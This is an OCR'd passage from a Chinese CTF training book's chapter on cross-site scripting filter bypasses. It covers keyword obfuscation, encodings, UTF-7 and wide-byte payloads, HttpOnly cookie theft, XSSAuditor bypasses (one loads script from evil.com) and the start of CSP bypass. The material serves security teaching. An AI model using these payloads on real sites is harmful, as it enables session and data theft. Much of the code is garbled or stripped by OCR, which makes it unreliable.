onmouseover
onsuspend
onformchange
dnesnouuo
ontimeupdate
onmousewheel
onvolumechange
另外，还有一些标签属性本身不属于事件属性，但可用于执行
JavaScript代码，比如常见的JavaScript伪协议：
clickme
同时，HTML5也带来了一些新的属性，可以用于对事件过滤进
行绕过操作，例如：
1.
2.X
3.敏感关键字（字符）过滤
关键字过滤大部分是针对敏感变量或函数而进行的，如cookie
eval等，这部分的过滤可通过字符串拼接、编码解码等方法进行绕过。
---
## Page 84
CTF特训营：技术详解、解题方法与
3.3防护与绕过
84/1144
（1）字符串拼接与混淆
JavaScript中的对象方法可通过数组的方式进行调用，如调用
alert函数，可以使用如下方式：
window[alert](/xss/);
可以看到，数组下标是想要调用函数名字的字符串，既然是字符
第，那么自然就可以通过拼接的方式进行混淆，代码如下：
window['al+'ert)(/xss/)
我们还可以使用JavaScript自带的Base64编码解码函数来实现字
符串过滤的绕过，btoa函数可以将字符串编码为Base64字符串，atob
函数可以将Base64字符串还原，比如，btoa("alert"）会返回
"YWxlcnQ=”，这时利用如下代码也可实现与alert（/xss/）)相同的效果：
window[atob("YWxl"+"cnQ=")](/xss/)
(2）编码解码
基于字符串的代码混淆不仅可以通过字符串拼接的方式来实现
---
## Page 85
CTF特训营：技术详解、解题方法与
8.3防护与绕过
85/1144
还可以通过各种编码、解码来实现。XSS漏洞中常用的编码方式包括：
HTML进制编码：十进制（&#97：）、十六进制（&#x61：）
CSS进制编码：兼容HTML中的进制表现形式，十进制、十六进
制（161)
Javascript进制编码：八进制（\141）、十六进制（x61）、
Unicode编码（\u61)、ASCll（String.fromCharCode（97))
URL编码：%61
·JSFuck编码
这里值得一提的是JSFuck编码，它可以只使用“O！+”6个字符
来编写Javascrip程序，在某些场景下具有奇效。例如alert（1）可编码
为：
m+]]+](0+□1）+[m+j+□+i]]+]（0+□i）)+[□+j+[+1+[+j+□+j+□+i]]+]（0+[00)+[10+]]+]（0+□i)】0
+（！+D[+!+0+!++1+]+（！+D[+[+1+m（[!+D[+[++（D+D[++0+!++!++
++1+]+（0+0)+++1+0]+（+0)[++0】]+（+0)[+++1++|+0】]+(1+0)[+++
]+](□+□i）+[+i+□+i+□+i+□+i+□+i]]+]（□+[m0）+[++](□+□i)）+[+i+□+i++i]]+]（□+[
[++|+0]+（0+0)[+[+0]+（0+0)[+[+0+1++|+0]+（0+0)[+[+|+0+0)[+[++1++|+
]+]（0+011）+[110+】]+]（0+011)+[00+1+0+1+0+1]]+](0+□1)+[0+1+]]+]（0+[0】0)+[110+1+0+1+0+1+0
+]（0+i)++i+0+i++i+□+i++i]]+1（□+[0）+[++]（0+）0)+[++](0+[)+[+i+]
【++!+0+（+0)[+[+0+（+0)[+++++|+0】]+（1+0)[++|+]+□)[+++|++!+
]+（!+D)[+[+】]+（D[（!0+)[+[[+]+(D]+D)[+[！++!++1++!++!+】]+（0+D)[+[[+0+
+]+（！+D)[+[[+]+(!+D)[+!++!++!+D]+（！+D)[+[[+!+]+)[+[++!++!++!+[
]+!++!+]+（+□)[+[+!+((+□)[+[+!+]+（!+□)[+[!++!+]+（！!+)[+[++!++
---
## Page 86
CTF特训营：技术详解、解题方法与
8.3防护与绕过
86/1144
++i+□+i++i+□+i+](+[)+[0++](□+i)】0)++】]+1(□+□ii)+[+i+】]+](□+□ii）+[+i
+]+（!+)[+!++!+]+（(！!+)[+[+]+（！!+)[+++!+++]+（！!+)[+[[+!+]+[
+□+i+□+i+□+i]]+](0+[00）+[10+】]+]（0+0i)]0)+[0+i+]+[0+i+□+i+0+i+□+i+0+1]]+[1+i+]]+]([
++|+]+（0+0)+++1+]+(+0)[++0】]+（1+0)+++++|+】]+(1+0)+++
（+j++j+□+j+□+j++j++i]]+[+j+]]+]（□+[
这里推荐使用编码工具xSSEE（https://evilcos.me/lab/xssee/）
其包含了大量的编码方式，非常实用。
（3)location.*、window.name
既然开发者会对输入的敏感关键字进行过滤，那么可以将XSS代
码放置于其他不被浏览器提交至服务端的部分，如location.*、
window.name等处，location.的构造如下：
http://example.com/xss.php?input=#
window.name的构造页面如下：
利用location对象结合字符串编码可以绕过很多基于关键字的过
滤。
---
## Page 87
CTF特训营：技术详解、解题方法与
3.3防护与绕过
87/1144
也有一部分关键字过滤是针对敏感符号的过滤，如括号、空格、
小数点等。
（4）过滤“"
在JavaScript中，可以使用with关键字设置变量的作用域，利用
此特性可以绕过对“”的过滤，如：
with(document)alert(cookie);
(5）过滤“0)"
在JavaScript中，可以通过绑定错误处理函数，使用throw关键字
传递参数绕过对“”的过滤，如：
window.onerror=alert:throw1;
（6）过滤空格
在标签属性间可使用换行符0x09、0x10、0x12、0x13、0x0a等
字符代替空格绕过过滤，如：
http://example.com/xss.php?input=
---
## Page 88
CTF特训营：技术详解、解题方法与
3.3防护与绕过
88/1144
在标签名称和第一个属性间也可以使用“”代替空格，如：
(7）svg标签
svg内部的标签和语句遵循的规则是直接继承自xml而不是html
区别在于svg内部的script标签中可以允许存在一部分进制或编码后的
字符（比如实体编码）：
/script>
4.字符集编码导致的绕过
当字符集编码存在问题时常常会导致一些出乎意料的绕过，举例
说明如下。
（1）古老的UTF-7与US-ASCII
在没有通过Content-Type或meta标签设置字符集时，如果IE的编
码设置为自动检测，那么它会根据一些BOM字符来判断当前的字符
集（现在已不适用），如：
---
## Page 89
CTF特训营：技术详解、解题方法与
3.3防护与绕过
89/1144
UTF-7
+ADw-script+AD4-alert(/xss/)+ADw-/script+AD4-
另外一种情况是，虽然E没有勾选自动检测字符集的设置，但可
以通过制作一个字符集为UTF-7的页面，并使用iframe标签来调用目
标页面，利用字符集继承漏洞来实现字符集的设定，如：
不过很遗憾，这种基于iframe的跨域字符集继承漏洞已经被修复
当前的情况是：继承的大前提是必须同域。
如果输出点是在title标签之内，meta标签之前，且字符集是由
meta标签所指定的，那么仍可通过如下方式注入meta标签指定字符
集来利用XSS漏洞，原型如下：
{{yourinput}
>
---
## Page 90
CTF特训营：技术详解、解题方法与
3.3防护与绕过
90/1144
在title标签中注入如下代码：
+ADw-script+AD4-alert(/xss/)+ADw-/script+AD4-:
最终可以构造出：
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
y>
基于US-ASCII字符集的XSS漏洞与基于UTF-7的XSS漏洞很相
似，代码如下：
scriptalert（1）/script
>
（2）宽字节
---
## Page 91
CTF特训营：技术详解、解题方法与
3.3防护与绕过
91/1144
考虑如下代码：
XSS
varq="”
>
这段代码通过str_replace和addslashes对输入进行过滤，而这里
可以使用宽字节进行绕过，Payload如下：
http://example.com/xss.php?input=%d5%22;alert(1);/
（3）一些特殊的字符
日本安全研究人员Masatokinugawa对浏览器字符集编码进行测
试后发现，由于字符集的原因，在浏览器中会出现如下几种情况
特定的byte最后会变成特别的字符。
特定的byte会破坏紧随其后的文字。
特定的byte会被忽略。
---
## Page 92
CTF特训营：技术详解、解题方法与
3.3防护与绕过
92/1144
这些特殊字符可用于绕过浏览器的xSSAuditor、制造基于字符
编码的XSS漏洞等方面，如图3-4所示。
Chromeの一
→×fvulnerabledoma.in/char_test7body=alert%281%29
第三方库工厂函数
诸如jQuery等第三方JavaScript库大部分都会提供相应的工厂函
数，如jQuery中的“$()”，它会自动构造标签，并且执行其中的代码：
/>
注释
在一些环境下可以使用注释来绕过长度限制。具体操作是将XSS
代码分为多个阶段，在每个阶段的代码前后添加注释符号，依次注入
XSS代码，这样不同阶段的代码就可以组合到一起了，如下所示：
stage 1:
6.HttpOnly绕过
---
## Page 94
CTF特训营：技术详解、解题方法与，
3.3防护与绕过
94/1144
HttpOnly是Cookie的一个安全属性，设置后则可以在xSS漏洞发
生时避免JavaScript读取到Cookie，但即使设置了HttpOnly属性，也
仍有方法获取到Cookie值。
(1)CVE-2012-0053
Apache服务器2.2.0-2.2.21版本存在一个漏洞CVE-2012-0053：
攻击者可通过向网站植入超大的Cookie，令其HTTP头超过Apache的
LimitRequestFieldSize（最大请求长度，4192字节），使得Apache返
回40o错误，状态页中包含了HttpOnly保护的Cookie。
源代码可参见：https://www.exploit-db.com/exploits/18442/
除了Apache，一些其他的Web服务器在使用者不了解其特性的
情况下，也很容易出现HttpOnly保护的Cookie被爆出的情况，例如
Squid等。
(2）PHPINFO页面
无论是否设置了HttpOnly属性，phpinfo（）函数都会输出当前请求
上下文的Cookie信息。如果目标网站存在PHPINFO页面，就可以通
过xMLHttpRequest请求该页面获取Cookie信息。
---
## Page 95
CTF特训营：技术详解、解题方法与，
3.3防护与绕过
95/1144
(3)Flash/Java
安全团队seckb在2012年提出，通过Flash、Java的一些APi可以
获取到HttpOnlyCookie，这种情况可以归结为客户端的信息泄露，链
接地址为：http://seckb.yehg.net/2012/06/xss-gaining-access-to-
httponly-cookie.html
7.XSSAuditor绕过
反射型XSS漏洞作为一种最容易发现和挖掘的XSS漏洞，从被发
现至今已经活跃了非常长的时间。但是由于浏览器的xSSAuditor的
出现，使反射型xSS漏洞的作用被逐步弱化。XSSAuditor通过检查
输入的内容，判断该内容是否在输出中出现。如果符合xSSAuditor
的过滤条件，则会直接阻止脚本执行，如图3-5所示。
---
## Page 96
CTF特训营：技术详解、解题方法与
3.3防护与绕过
96/1144
example.com
wabzsy
 example.com/xss.php?input=
应用InkSecAndroidOtherHackLinuxGitHubSwift
其他书签
该网页无法正常运作
Chrome在此网页上检测到了异常代码。为保护您的个人信息（例如密码、电话号码和信用卡信息）
Chrome已将该网页拦截。
请尝试访问该网站的首页。
ERR_BLOCKED_BY_XSS_AUDITOR
图3-5Chrome浏览器的XSSAuditor防护
然而安全人员的研究表明，XSSAuditor同样可以被绕过。
字符集编码导致的绕过。正如前文所言，在一定场景下，字符
集编码可能会导致xSS过滤的绕过，在xSSAuditor中也是一样。
由于低版本Chrome浏览器对ISO-2022-JP等编码处理不当，在页
面没有设置默认编码并使用这个日语字符集时，XSSAuditor检查的
部分会向Payload添加oxOf字符，这样就可以绕过xSSAuditor。XSS
代码如下：
---
## Page 97
CTF特训营：技术详解、解题方法与
97/1144
这其实是利用了浏览器处理学符集时产生的漏洞，随着以后学符
集的更新，这种漏洞仍然有可能出现。
协议理解问题导致的绕过。协议理解问题也会导致Chrome浏览
器的xSSAuditor被绕过，因为xSSAuditor在检查加载脚本的路径时
有一个比较有趣的地方：如果加载的脚本在自身目录下，并且XSS的
输出点在HTML属性中，那么XSSAuditor是不会对其进行拦截的。但
是如果检测到了“/”这样的外部链接的话，就会触发Auditor，从而
无法加载外部脚本。
结合XSSAuditor对HTTPS协议的错误理解，可以构造如下XSS
代码绕过XsSAuditor：
http://example.com/xss.php?input=1><link%20rel=rimport*%20href=https:evil.com/1
php
CRLF导致的绕过。Chrome浏览器的XSSAuditor默认是开启的
但如果HTTP响应头中的X-XSS-Protection属性被设置为O，那么
Chrome浏览器会关闭xSSAuditor。因此，如果在HTTP响应头中注入
---
## Page 98
CTF特训营：技术详解、解题方法与.
3.3防护与绕过
98/1144
CRLF并在新一行中写入X-XSS-Protection：0，那么接下来的XSS代码
将不再受到xSSAuditor的拦截
8.内容安全策略（CSP）绕过
内容安全策略（CSP）是目前最主要的Web安全保护机制之一，
这个功能可以有效地帮助开发者降低网站遭受XSS漏洞攻击的可能
性。得益于CSP，开发者可以创建并强制部署一些安全管理规则，并
规定网站可以获取或加载的内容。
内容安全策略以白名单的机制来管理网站要加载或执行的资源
在网页中，这样的策略是通过HTTP头信息或者meta标签来定义的
需要注意的是，虽然这个策略可以防止攻击者从外部网站跨域加载恶
意代码，但是CSP并不能防止数据泄露。自前已经有很多安全研究人
员提出了各种各样的技术来绕过内容安全策略，并利用该技术从目标
网站中提取出所需数据。
（1）CSP配置错误